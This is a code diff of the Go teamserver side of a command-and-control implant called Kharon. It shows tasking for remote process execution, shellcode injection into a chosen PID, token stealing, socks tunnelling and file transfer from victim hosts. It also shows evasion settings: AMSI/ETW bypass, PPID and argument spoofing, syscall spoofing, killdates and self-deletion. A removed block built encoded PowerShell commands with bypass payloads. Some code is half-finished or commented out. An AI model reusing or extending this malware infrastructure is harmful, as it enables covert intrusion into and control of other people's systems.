-	b.WriteString(row("Syscall Method", syscallStr(data.evasion.syscall)))
-	b.WriteString(row("AMSI/ETW Bypass", amsietwbpStr(data.evasion.amsi_etw_bypass)))
-	b.WriteString(border("middle"))
-
-	// ==================== PROCESS SPAWNING ====================
-	b.WriteString(sectionTitle("PROCESS SPAWNING"))
-	b.WriteString(border("middle"))
-	b.WriteString(row("Parent PID", fmt.Sprintf("%d", data.ps.parent_id)))
-	b.WriteString(row("Block DLLs", boolStr(data.ps.block_dlls)))
-	b.WriteString(row("Spawn To", data.ps.spawnto))
-	b.WriteString(row("Fork Pipe", data.ps.fork_pipe))
-	b.WriteString(border("middle"))
-
-	// ==================== KILLDATE ====================
-	b.WriteString(sectionTitle("KILLDATE CONFIGURATION"))
-	b.WriteString(border("middle"))
-	b.WriteString(row("Use Killdate", boolStr(data.killdate.enabled)))
-	b.WriteString(row("Exit Type", func() string {
-		if data.killdate.exit {
-			return "Exit Process"
-		}
-		return "Exit Thread"
-	}()))
-	b.WriteString(row("Self Delete", boolStr(data.killdate.selfdel)))
-	b.WriteString(row("Killdate", data.killdate.date.Format("02/01/2006")))
-	b.WriteString(border("middle"))
-
-	// ==================== WORKTIME ====================
-	b.WriteString(sectionTitle("WORKTIME CONFIGURATION"))
-	b.WriteString(border("middle"))
-	b.WriteString(row("Enable Worktime", boolStr(data.worktime.enabled)))
-	b.WriteString(row("Start Time", data.worktime.start))
-	b.WriteString(row("End Time", data.worktime.end))
-	b.WriteString(border("middle"))
-
-	// ==================== GUARDRAILS ====================
-	b.WriteString(sectionTitle("GUARDRAILS"))
-	b.WriteString(border("middle"))
-	b.WriteString(row("IP Address", data.guardrails.ipaddress))
-	b.WriteString(row("Hostname", data.guardrails.hostname))
-	b.WriteString(row("Username", data.guardrails.username))
-	b.WriteString(row("Domain", data.guardrails.domain))
-	b.WriteString(border("middle"))
-
-	// ==================== SYSTEM INFORMATION ====================
-	b.WriteString(sectionTitle("SYSTEM INFORMATION"))
-	b.WriteString(border("middle"))
-	b.WriteString(row("Username", data.machine.username))
-	b.WriteString(row("Computer Name", data.machine.computer))
-	b.WriteString(row("NetBIOS Name", data.machine.netbios))
-	b.WriteString(row("Domain", data.machine.domain))
-	b.WriteString(row("IP Address", data.machine.ipaddress))
-	b.WriteString(row("OS Architecture", fmt.Sprintf("0x%02X", data.machine.os_arch)))
-	b.WriteString(row("OS Version", fmt.Sprintf("%d.%d.%d",
-		data.machine.os_major,
-		data.machine.os_minor,
-		data.machine.os_build)))
-	b.WriteString(row("Processor Name", data.machine.processor_name))
-	b.WriteString(row("Processor Count", fmt.Sprintf("%d", data.machine.processor_numbers)))
-	b.WriteString(border("middle"))
-
-	// ==================== MEMORY INFORMATION ====================
-	b.WriteString(sectionTitle("MEMORY INFORMATION"))
-	b.WriteString(border("middle"))
-	b.WriteString(row("Total RAM", fmt.Sprintf("%d MB", data.machine.ram_total)))
-	b.WriteString(row("Available RAM", fmt.Sprintf("%d MB", data.machine.ram_aval)))
-	b.WriteString(row("Used RAM", fmt.Sprintf("%d MB", data.machine.ram_used)))
-	b.WriteString(row("RAM Usage", fmt.Sprintf("%d%%", data.machine.ram_perct)))
-	b.WriteString(row("Page Size", fmt.Sprintf("%d bytes", data.machine.page_size)))
-	b.WriteString(row("Allocation Granularity", fmt.Sprintf("%d bytes", data.machine.allocation_gran)))
-	b.WriteString(border("middle"))
-
-	// ==================== SECURITY FEATURES ====================
-	b.WriteString(sectionTitle("SECURITY FEATURES"))
-	b.WriteString(border("middle"))
-	b.WriteString(row("CFG Enabled", boolStr(data.machine.cfg_enabled)))
-	b.WriteString(row("DSE Status", dseStatusStr(data.machine.dse_status)))
-	b.WriteString(row("VBS/HVCI", vbsHvciStr(data.machine.vbs_hvci)))
-	b.WriteString(border("bottom"))
-
-	return b.String()
-}
-
 func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.TaskData, ax.ConsoleMessageData, error) {
 	var (
 		taskData    ax.TaskData
@@ -1935,7 +917,12 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 		switch subcommand {
 
 		case "list":
-			array = []interface{}{TASK_PROC, PROC_LIST}
+			bofData, err := LoadExtModule("list", "x64")
+			if err != nil {
+				goto RET
+			}
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, PROC_LIST, 0, 0}
 
 		case "run":
 			programArgs, ok := args["cmd"].(string)
@@ -1943,117 +930,45 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'cmd' must be set")
 				goto RET
 			}
-			array = []interface{}{TASK_PROC, PROC_RUN, ConvertCpToUTF16(programArgs, agent.ACP)}
 
+			bofData, err := LoadExtModule("create", "x64")
+			if err != nil {
+				goto RET
+			}
+
+			bofParam, err := PackExtData(
+				PackExtDataWChar(programArgs, agent.ACP),
+			)
+			if err != nil {
+				goto RET
+			}
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, PROC_RUN, len(bofParam), bofParam}
 		case "kill":
 			pid, ok := args["pid"].(float64)
 			if !ok {
 				err = errors.New("parameter 'pid' must be set")
 				goto RET
 			}
-			array = []interface{}{TASK_PROC, PROC_KILL, int(pid)}
-		case "pwsh":
-			fullCmd := ""
 
-			command, ok := args["cmd"].(string)
-			if !ok {
-				err = errors.New("parameter 'cmd' must be set")
-				goto RET
-			}
+			exit_code, _ := args["exit_code"].(int)
 
-			script, scriptOk := args["script"].(string)
-			var scriptStr string
-
-			bypass, bypassOk := args["bypass"].(string)
-
-			exePath, err := os.Executable()
+			bofData, err := LoadExtModule("kill", "x64")
 			if err != nil {
-				err = fmt.Errorf("failed to get executable path: %v", err)
 				goto RET
 			}
 
-			fmt.Printf("[DEBUG] Executable path: %s\n", exePath)
-
-			exeDir := filepath.Dir(exePath)
-			fmt.Printf("[DEBUG] Executable directory: %s\n", exeDir)
-
-			bypassBasePath := filepath.Join(exeDir, "extenders", "agent_kharon", "src_modules", "PwshBypass", "Bin", "amsi_etw_bypass.")
-			fmt.Printf("[DEBUG] Bypass base path: %s\n", bypassBasePath)
-
-			var bypassFile string
-			var bypassContent []byte
-
-			if bypassOk && bypass != "" {
-				fmt.Printf("[DEBUG] Bypass option specified: %s\n", bypass)
-				switch bypass {
-				case "amsi":
-					bypassFile = bypassBasePath + "amsi.bin"
-				case "etw":
-					bypassFile = bypassBasePath + "etw.bin"
-				case "all":
-					bypassFile = bypassBasePath + "both.bin"
-				default:
-					err = fmt.Errorf("invalid bypass option: %s. Valid options: amsi, etw, all", bypass)
-					fmt.Printf("[ERROR] %v\n", err)
-					goto RET
-				}
-
-				fmt.Printf("[DEBUG] Loading bypass file: %s\n", bypassFile)
-				bypassContent, err = os.ReadFile(bypassFile)
-				if err != nil {
-					err = fmt.Errorf("failed to read bypass file '%s': %v", bypassFile, err)
-					fmt.Printf("[ERROR] %v\n", err)
-					goto RET
-				}
-
-				fmt.Printf("[DEBUG] Bypass file loaded successfully (%d bytes)\n", len(bypassContent))
-			} else {
-				fmt.Printf("[DEBUG] No bypass option specified\n")
+			bofParam, err := PackExtData(
+				int32(pid),
+				exit_code,
+			)
+			if err != nil {
+				goto RET
 			}
 
-			var finalScript strings.Builder
-
-			if scriptOk && script != "" {
-				fmt.Printf("[DEBUG] Script parameter provided (encoded: %t)\n", len(script) > 0)
-				if decoded, err := base64.StdEncoding.DecodeString(script); err == nil {
-					scriptStr = string(decoded)
-					fmt.Printf("[DEBUG] Script decoded from base64 (%d bytes)\n", len(scriptStr))
-				} else {
-					scriptStr = script
-					fmt.Printf("[DEBUG] Script used as-is (%d bytes)\n", len(scriptStr))
-				}
-				finalScript.WriteString(scriptStr)
-				finalScript.WriteString("\n")
-			} else {
-				fmt.Printf("[DEBUG] No script parameter provided\n")
-			}
-
-			fmt.Printf("[DEBUG] Command to execute: %s\n", command)
-			finalScript.WriteString(command)
-
-			finalScriptStr := finalScript.String()
-			fmt.Printf("[DEBUG] Final script size: %d bytes\n", len(finalScriptStr))
-
-			encodeForPowerShell := func(s string) string {
-				utf16Bytes := utf16.Encode([]rune(s))
-				byteSlice := make([]byte, len(utf16Bytes)*2)
-				for i, r := range utf16Bytes {
-					byteSlice[i*2] = byte(r)
-					byteSlice[i*2+1] = byte(r >> 8)
-				}
-				encoded := base64.StdEncoding.EncodeToString(byteSlice)
-				fmt.Printf("[DEBUG] Encoded command size: %d bytes\n", len(encoded))
-				return encoded
-			}
-
-			encodedCmd := encodeForPowerShell(finalScriptStr)
-			fullCmd = fmt.Sprintf("powershell.exe -EncodedCommand %s", encodedCmd)
-			fmt.Printf("[DEBUG] Full command prepared: powershell.exe -EncodedCommand <...>\n")
-
-			fmt.Printf("[DEBUG] Task array - Type: TASK_PROC, Proc: PROC_PWSH, Bypass content size: %d\n", len(bypassContent))
-			array = []interface{}{TASK_PROC, PROC_PWSH, ConvertCpToUTF16(fullCmd, agent.ACP), len(bypassContent), bypassContent}
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, PROC_KILL, len(bofParam), bofParam}
 		default:
-			err = errors.New("subcommand for 'ps': 'list', 'run', 'kill' or 'pwsh'")
+			err = errors.New("subcommand for 'ps': 'list', 'run' or 'kill'")
 			goto RET
 		}
 
@@ -2073,11 +988,13 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 
-			bofParam, err := BofPackData(ConvertUTF8toCp(path, agent.ACP))
+			bofParam, err := PackExtData(
+				PackExtDataWChar(path, agent.ACP),
+			)
 			if err != nil {
 				goto RET
 			}
-			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, FS_CAT, len(bofParam), bofParam}
 
 		case "cd":
 			path, ok := args["path"].(string)
@@ -2091,17 +1008,19 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 
-			fmt.Printf("[DEBUG] Changing directory to: %s\n", path)
-			fmt.Printf("[DEBUG] bof file: size %d", bofData)
+			fmt.Printf("bof file content size: %d\n", len(bofData))
 
-			hex.Dump(bofData)
-
-			bofParam, err := BofPackData(ConvertUTF8toCp(path, agent.ACP))
+			bofParam, err := PackExtData(
+				PackExtDataWChar(path, agent.ACP),
+			)
 			if err != nil {
+				fmt.Printf("ERROR: %v\n", err)
 				goto RET
 			}
 
-			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
+			fmt.Printf("bof param content size: %d\n", len(bofParam))
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, FS_CD, len(bofParam), bofParam}
 
 		case "cp":
 			src, ok := args["src"].(string)
@@ -2120,14 +1039,14 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 
-			bofParam, err := BofPackData(
-				ConvertUTF8toCp(src, agent.ACP),
-				ConvertUTF8toCp(dst, agent.ACP),
+			bofParam, err := PackExtData(
+				PackExtDataWChar(src, agent.ACP),
+				PackExtDataWChar(dst, agent.ACP),
 			)
 			if err != nil {
 				goto RET
 			}
-			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, FS_COPY, len(bofParam), bofParam}
 
 		case "ls":
 			dir, ok := args["directory"].(string)
@@ -2146,11 +1065,14 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 
-			bofParam, err := BofPackData(ConvertUTF8toCp(dir, agent.ACP))
+			bofParam, err := PackExtData(
+				PackExtDataWChar(dir, agent.ACP),
+			)
 			if err != nil {
 				goto RET
 			}
-			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
+
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, int(FS_LIST), len(bofParam), bofParam}
 
 		case "mv":
 			src, ok := args["src"].(string)
@@ -2169,14 +1091,14 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 
-			bofParam, err := BofPackData(
-				ConvertUTF8toCp(src, agent.ACP),
-				ConvertUTF8toCp(dst, agent.ACP),
+			bofParam, err := PackExtData(
+				PackExtDataWChar(src, agent.ACP),
+				PackExtDataWChar(dst, agent.ACP),
 			)
 			if err != nil {
 				goto RET
 			}
-			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, FS_MOVE, len(bofParam), bofParam}
 
 		case "mkdir":
 			path, ok := args["path"].(string)
@@ -2190,11 +1112,13 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 
-			bofParam, err := BofPackData(ConvertUTF8toCp(path, agent.ACP))
+			bofParam, err := PackExtData(
+				PackExtDataWChar(path, agent.ACP),
+			)
 			if err != nil {
 				goto RET
 			}
-			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, FS_MKDIR, len(bofParam), bofParam}
 
 		case "pwd":
 			bofData, err := LoadExtModule("pwd", "x64")
@@ -2204,11 +1128,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 			fmt.Printf("bof file content size: %d\n", bofData)
 
-			bofParam, err := BofPackData()
-			if err != nil {
-				goto RET
-			}
-			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, 0, 0}
 
 		case "rm":
 			path, ok := args["path"].(string)
@@ -2222,11 +1142,13 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 
-			bofParam, err := BofPackData(ConvertUTF8toCp(path, agent.ACP))
+			bofParam, err := PackExtData(
+				PackExtDataWChar(path, agent.ACP),
+			)
 			if err != nil {
 				goto RET
 			}
-			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
+			array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, int(FS_PWD), len(bofParam), bofParam}
 
 		default:
 			err = errors.New("subcommand for 'fs': 'cat', 'cd', 'cp', 'ls', 'mv', 'mkdir', 'pwd', 'rm'")
@@ -2252,8 +1174,6 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 		taskData.Message   = "Kharon config informations:"
 		taskData.Completed = true
 		taskData.ClearText = console_out
-
-		// ts.TsAgentConsoleOutput(agent.Id, MESSAGE_SUCCESS, "Kharon config informations:\n\n", fmt.Sprintf("\n\n%s", console_out), false)
 
 	case "socks":
 		taskData.Type = TYPE_TUNNEL
@@ -2409,7 +1329,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			Sync:    false,
 		}
 
-		fileID := generateRandomString(10)
+		fileID := gen_rnd_str(10)
 		inCmd := []interface{}{TASK_UPLOAD, int(0), ConvertUTF8toCp(fileID, agent.ACP), ConvertUTF8toCp(remote_path, agent.ACP)}
 		inTaskData.Data, _ = PackArray(inCmd)
 		inTaskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())
@@ -2453,7 +1373,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			err = errors.New("parameter 'remote_path' must be set")
 			goto RET
 		}
-		fileID := generateRandomString(10)
+		fileID := gen_rnd_str(10)
 		fmt.Printf("FileID: %s\n", fileID)
 		fmt.Printf("remote_Path: %s\n", remote_path)
 		array = []interface{}{TASK_DOWNLOAD, ConvertUTF8toCp(fileID, agent.ACP), ConvertUTF8toCp(remote_path, agent.ACP)}
@@ -2478,7 +1398,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			array = []interface{}{TASK_TOKEN, TOKEN_STEAL, int(pid), use}
 
 		case "impersonate":
-			id, ok := getIntFromArgs(args["token_id"])
+			id, ok := get_int_from_args(args["token_id"])
 			fmt.Printf("token id: %d\n", id)
 			if !ok {
 				err = errors.New("parameter 'id' must be set")
@@ -2490,7 +1410,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			array = []interface{}{TASK_TOKEN, TOKEN_LIST}
 
 		case "rm":
-			id, ok := getIntFromArgs(args["token_id"])
+			id, ok := get_int_from_args(args["token_id"])
 			if !ok {
 				err = errors.New("parameter 'id' must be set")
 				goto RET
@@ -2556,6 +1476,9 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			agent.Sleep = uint(sleepTime)
 			_ = ts.TsAgentUpdateData(agent)
 
+			kharon_cfg.session.sleep_time = uint32(sleepTime * 1000)
+			agent.CustomData, _ = kharon_cfg.Marshal()	
+
 		case "jitter":
 			jitter, jitterOk := args["val"].(float64)
 			if !jitterOk {
@@ -2575,12 +1498,18 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			agent.Jitter = uint(jitterTime)
 			_ = ts.TsAgentUpdateData(agent)
 
+			kharon_cfg.session.jitter = uint32(jitterTime)
+			agent.CustomData, _ = kharon_cfg.Marshal()
+
 		case "ppid":
 			pid, ok := args["pid"].(float64)
 			if !ok {
 				err = errors.New("parameter 'pid' must be set")
 				goto RET
 			}
+
+			kharon_cfg.ps.parent_id = uint32(pid)
+			agent.CustomData, _ = kharon_cfg.Marshal()
 
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_PPID, int(pid)}
 		case "argue":
@@ -2589,6 +1518,9 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'argument' must be set")
 				goto RET
 			}
+
+			kharon_cfg.ps.spoofarg = argument
+			agent.CustomData, _ = kharon_cfg.Marshal()
 
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_ARGUE, ConvertCpToUTF16(argument, agent.ACP)}
 		case "killdate.date":
@@ -2602,6 +1534,10 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			if err != nil {
 				goto RET
 			}
+
+			kharon_cfg.killdate.date = parsedDate
+			agent.CustomData, _ = kharon_cfg.Marshal()
+
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_KD_DATE, int(parsedDate.Year()), int(parsedDate.Month()), int(parsedDate.Day())}
 
 		case "killdate.selfdel":
@@ -2622,6 +1558,9 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 
+			kharon_cfg.killdate.selfdel = enabled != 0
+			agent.CustomData, _ = kharon_cfg.Marshal()
+
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_KD_SELFDEL, int(enabled)}
 		case "killdate.exit":
 			method, ok := args["method"].(string)
@@ -2641,6 +1580,9 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 
+			kharon_cfg.killdate.exit = enabled != 0
+			agent.CustomData, _ = kharon_cfg.Marshal()
+
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_KD_EXIT, int(enabled)}
 		case "mask.beacon":
 			tp, ok := args["type"].(string)
@@ -2659,6 +1601,10 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("unknown mask type. Type must be 'none' or 'timer'")
 				goto RET
 			}
+
+			kharon_cfg.mask.beacon = uint32(num)
+			agent.CustomData, _ = kharon_cfg.Marshal()
+
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_MASK, int(num)}
 
 		case "mask.heap":
@@ -2678,6 +1624,9 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("unknown status type. Type must be 'true' or 'false'")
 				goto RET
 			}
+			
+			kharon_cfg.mask.heap = enabled != 0
+			agent.CustomData, _ = kharon_cfg.Marshal()
 
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_MASK_HEAP, int(enabled)}
 		case "spawnto":
@@ -2686,6 +1635,9 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("parameter 'spawnto' must be set")
 				goto RET
 			}
+
+			kharon_cfg.ps.spawnto = spawnto
+			agent.CustomData, _ = kharon_cfg.Marshal()
 
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_SPAWN, ConvertCpToUTF16(spawnto, agent.ACP)}
 		case "blockdlls":
@@ -2705,34 +1657,39 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("unknown status type. Type must be 'true' or 'false'")
 				goto RET
 			}
+
+			kharon_cfg.ps.block_dlls = enabled != 0
+			agent.CustomData, _ = kharon_cfg.Marshal()
+
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_BLOCK_DLLS, int(enabled)}
 
 		case "amsi_etw_bypass":
-			{
-				bypass, ok := args["bypass"].(string)
-				if !ok {
-					err = errors.New("parameter 'bypass' must be set")
-					goto RET
-				}
-
-				bypass_n := 0
-				switch bypass {
-				case "amsi":
-					bypass_n = 0x700
-				case "etw":
-					bypass_n = 0x400
-				case "all":
-					bypass_n = 0x100
-				case "none":
-					bypass_n = 0x000
-				default:
-					err = errors.New("unknown bypass type. Type must be 'amsi', 'etw', 'all' or 'none'")
-					goto RET
-				}
-
-				array = []interface{}{TASK_CONFIG, 1, CONFIG_AE_BYPASS, int(bypass_n)}
+			
+			bypass, ok := args["bypass"].(string)
+			if !ok {
+				err = errors.New("parameter 'bypass' must be set")
+				goto RET
 			}
 
+			bypass_n := 0
+			switch bypass {
+			case "amsi":
+				bypass_n = 0x700
+			case "etw":
+				bypass_n = 0x400
+			case "all":
+				bypass_n = 0x100
+			case "none":
+				bypass_n = 0x000
+			default:
+				err = errors.New("unknown bypass type. Type must be 'amsi', 'etw', 'all' or 'none'")
+				goto RET
+			}
+	
+			kharon_cfg.evasion.amsi_etw_bypass = int32(bypass_n)
+			agent.CustomData, _ = kharon_cfg.Marshal()
+
+			array = []interface{}{TASK_CONFIG, 1, CONFIG_AE_BYPASS, int(bypass_n)}
 		case "syscall":
 			syscall, ok := args["syscall"].(string)
 			if !ok {
@@ -2752,6 +1709,9 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				err = errors.New("Unknown syscall method. Syscall must be 'spoof', 'spoof_indirect' or 'none'")
 			}
 
+			kharon_cfg.evasion.syscall = uint32(syscall_n)
+			agent.CustomData, _ = kharon_cfg.Marshal()
+
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_SYSCALL, int(syscall_n)}
 		case "fork_pipe_name":
 			forkPipeName := args["name"].(string)
@@ -2760,6 +1720,9 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 				goto RET
 			}
 
+			kharon_cfg.ps.fork_pipe = forkPipeName
+			agent.CustomData, _ = kharon_cfg.Marshal()
+
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_FORKPIPE, forkPipeName}
 
 		case "bofproxy":
@@ -2767,6 +1730,9 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			if !ok {
 				err = errors.New("parameter 'status' must be set")
 			}
+
+			kharon_cfg.evasion.bof_proxy = status
+			agent.CustomData, _ = kharon_cfg.Marshal()
 
 			array = []interface{}{TASK_CONFIG, 1, CONFIG_BOFPROXY, status}
 		default:
@@ -2785,12 +1751,26 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 			err = errors.New("parameter 'pid' must be set")
 			goto RET
 		}
+
 		shellcodeContent, err := base64.StdEncoding.DecodeString(shellcode)
 		if err != nil {
 			goto RET
 		}
 
-		array = []interface{}{TASK_SCINJECT, len(shellcodeContent), shellcodeContent, int(pid)}
+		bofData, err := LoadExtModule("scinject", "x64")
+		if err != nil {
+			goto RET
+		}
+
+		bofParam, err := PackExtData(
+			int(pid),
+			shellcodeContent,
+		)
+		if err != nil {
+			goto RET
+		}
+
+		array = []interface{}{TASK_EXEC_BOF, len(bofData), bofData, 0, len(bofParam), bofParam}
 
 	case "selfdel":
 		array = []interface{}{TASK_SELFDEL}
@@ -2834,75 +1814,87 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 			array = []interface{}{TASK_EXEC_BOF, len(bofContent), bofContent, cmdId, len(params), params}
 		case "postex":
-			taskData.Type = TYPE_JOB
+			// taskData.Type = TYPE_JOB
 
-			method, ok := args["method"].(string)
-			if !ok {
-				err = errors.New("parameter 'method' must be set")
-				goto RET
-			}
+			// method, ok := args["method"].(string)
+			// if !ok {
+			// 	err = errors.New("parameter 'method' must be set")
+			// 	goto RET
+			// }
 
-			fork_type_n := 0
+			// fork_type_n := 0
 
-			if method != "inline" && method != "fork" {
-				err = errors.New("parameter 'method' must be 'inline' or 'fork'")
-				goto RET
-			}
+			// if method != "inline" && method != "fork" {
+			// 	err = errors.New("parameter 'method' must be 'inline' or 'fork'")
+			// 	goto RET
+			// }
 
-			method_n := 0x15
+			// method_n := 0x15
 
-			if method == "inline" {
-				method_n = 0x15
-			} else if method == "fork" {
-				method_n = 0x20
+			// if method == "inline" {
+			// 	method_n = 0x15
+			// } else if method == "fork" {
+			// 	method_n = 0x20
 
-				fork_type, ok_1 := args["fork_type"].(string)
-				if !ok_1 {
-					err = errors.New("parameter 'fork_type' must be set")
-					goto RET
-				}
+			// 	fork_type, ok_1 := args["fork_type"].(string)
+			// 	if !ok_1 {
+			// 		err = errors.New("parameter 'fork_type' must be set")
+			// 		goto RET
+			// 	}
 
-				if fork_type == "explicit" {
-					fork_type_n = 0x100
-				} else if fork_type == "spawn" {
-					fork_type_n = 0x200
-				}
-			}
+			// 	if fork_type == "explicit" {
+			// 		fork_type_n = 0x100
+			// 	} else if fork_type == "spawn" {
+			// 		fork_type_n = 0x200
+			// 	}
+			// }
 
-			scFile, ok := args["sc_file"].(string)
-			if !ok {
-				err = errors.New("parameter 'sc_file' must be set")
-				goto RET
-			}
+			// scFile, ok := args["sc_file"].(string)
+			// if !ok {
+			// 	err = errors.New("parameter 'sc_file' must be set")
+			// 	goto RET
+			// }
 
-			explicitPid := 0
-			if pidVal, ok := args["pid"]; ok {
-				if pidInt, ok := pidVal.(int); ok {
-					explicitPid = pidInt
-				} else {
-					if pidFloat, ok := pidVal.(float64); ok {
-						explicitPid = int(pidFloat)
-					}
-				}
-			} else {
-				fmt.Printf("[DEBUG] pid arg does NOT exist in args map\n")
-			}
+			// explicitPid := 0
+			// if pidVal, ok := args["pid"]; ok {
+			// 	if pidInt, ok := pidVal.(int); ok {
+			// 		explicitPid = pidInt
+			// 	} else {
+			// 		if pidFloat, ok := pidVal.(float64); ok {
+			// 			explicitPid = int(pidFloat)
+			// 		}
+			// 	}
+			// } else {
+			// 	fmt.Printf("[DEBUG] pid arg does NOT exist in args map\n")
+			// }
 
-			scContent, err := base64.StdEncoding.DecodeString(scFile)
-			if err != nil {
-				goto RET
-			}
+			// scContent, err := base64.StdEncoding.DecodeString(scFile)
+			// if err != nil {
+			// 	goto RET
+			// }
 
-			var params []byte
-			paramData, ok := args["param_data"].(string)
-			if ok {
-				params, err = base64.StdEncoding.DecodeString(paramData)
-				if err != nil {
-					params = []byte(paramData)
-				}
-			}
+			// var params []byte
+			// paramData, ok := args["param_data"].(string)
+			// if ok {
+			// 	params, err = base64.StdEncoding.DecodeString(paramData)
+			// 	if err != nil {
+			// 		params = []byte(paramData)
+			// 	}
+			// }
 
-			array = []interface{}{TASK_POSTEX, int(method_n), int(fork_type_n), int(explicitPid), len(scContent), scContent, len(params), params}
+			// parent_id_spoof := kharon_cfg.ps.parent_id
+			// block_dlls      :=  kharon_cfg.ps.block_dlls
+
+			// bofData, err := LoadExtModule( "sc_postex", "x64")
+			// if err != nil {
+			// 	goto RET
+			// }
+
+			// bofParam, err := PackExtData(
+
+			// )
+
+			// array = []interface{}{TASK_EXEC_BOF, int(explicitPid), len(scContent), scContent, len(params), params}
 		default:
 			err = errors.New("subcommand for 'execute': 'bof', 'postex'")
 			goto RET
@@ -2919,6 +1911,7 @@ func CreateTask(ts Teamserver, agent ax.AgentData, args map[string]any) (ax.Task
 
 	/// END CODE
 
+	fmt.Printf("tasking command: %s | sub command: %s\n", command, subcommand)
 RET:
 	return taskData, messageData, err
 }
@@ -2928,7 +1921,7 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 
 	/// START CODE
 
-	packer := CreatePacker(packedData)
+	packer := CreatePacker( packedData )
 
 	// Print packedData
 	// fmt.Printf("=== PACKED DATA DEBUG ===\n")
@@ -2979,6 +1972,7 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 				task.MessageType = MESSAGE_SUCCESS
 				screenBuff := packer.ParseBytes()
 				ts.TsScreenshotAdd(agentData.Id, "", screenBuff)
+
 			case CALLBACK_OUTPUT_OEM:
 				output := packer.ParseString()
 
@@ -2999,7 +1993,7 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 			task.Completed = false
 			outTasks = append(outTasks, task)
 
-		} else if dataType == uint(MSG_QUICK) || dataType == uint(MSG_OUT) { // web || smb
+		} else if dataType == uint(PROFILE_WEB) || dataType == uint(PROFILE_SMB) { // web || smb
 
 			if false == packer.CheckPacker([]string{"array"}) {
 				return outTasks
